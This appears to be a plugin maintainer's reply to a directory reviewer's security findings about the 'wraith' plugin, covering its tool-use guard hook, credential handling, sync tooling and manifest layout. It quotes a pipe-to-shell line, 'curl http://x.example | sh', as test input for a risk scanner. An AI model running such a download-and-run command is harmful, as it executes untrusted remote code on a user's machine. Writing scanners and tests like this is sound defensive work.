# Notes for the Claude directory reviewer

These notes answer the findings raised in review of wraith. Where a
paragraph says "the pending release", the fix is written but not yet
published. No version number is claimed here.

## Hook approval

The PreToolUse guard (`hooks/guard.py`) only ever answers `ask` or `deny`.
In `off` mode it prints nothing, and it also prints nothing when no pattern
matches or when anything goes wrong. It never answers `allow` and it never
rewrites the tool input; the only thing it writes is a permission decision
and a reason. The word "approve" appears in the source because one of the
patterns detects `terraform apply -auto-approve`, which the guard asks about
before it runs. In the pending release, `render()` raises on any decision
other than `ask` or `deny` (the guard's top-level handler turns that into no
output), that pattern's label is renamed from `terraform-auto-approve` to
`terraform-apply-unattended` (it still matches `-auto-approve`), and a test,
`tests/test_guard.py::test_every_pattern_every_mode_emits_only_ask_or_deny`,
checks every pattern in every mode.

## Credential findings

The hooks make no network calls: they import only `json`, `os`, `re`, `sys`
and `pathlib`. Wraith ships no MCP server. Some skills do tell the agent to
run tools such as `gh`, `curl`, `npx` or `uvx` when the user asks for that
work; those are the user's own tools run in the user's session, not code the
plugin runs by itself. `scripts/fetch_upstream.sh` and
`tests/test_sync_upstream.py` are maintainer tooling for syncing upstream
skills in CI. They talk to github.com through git and the plugin never runs
them. `skills/wizard/assets/template.sh` is a template the agent copies into
a script that the user runs by hand; its `gh secret set` call uses the
user's own GitHub CLI, signed in as the user, against GitHub. In the pending
release the template's example stage becomes a GCP Workload Identity
Federation example that only sets variables. The helper library above the
STAGES marker is unchanged, because it is the upstream helper library.

A check of the Claude plugin docs found no supported way to exclude files
from the bundle: the manifest and marketplace references offer only
`sparsePaths`, which the user sets, or moving the plugin into a subdirectory.
Moving it would change the layout both hosts were tested against (ADR 0001),
so that is deferred.

## Download-and-run

The `curl http://x.example | sh` string in `tests/test_sync_upstream.py` is
test input. It is a line inside a sample diff, used to prove that the sync
risk scanner flags pipe-to-shell (the test expects the `pipe-to-shell`
label). It is never executed. In the pending release a one-line comment
above it says so.

## Root `plugin.json`

The root `plugin.json` is kept on purpose. It is the Agent Plugins 1.0
manifest that GitHub Copilot reads, and the awesome-copilot submission was
made against this layout. The Claude manifest lives separately in
`.claude-plugin/`. ADR 0001 (status: proposed) tested a minimal plugin with
both manifests and found that Claude's strict validation names no warning
against the root `plugin.json`. In the pending release the Claude manifest
also gains documentation, support, privacy and terms URLs.
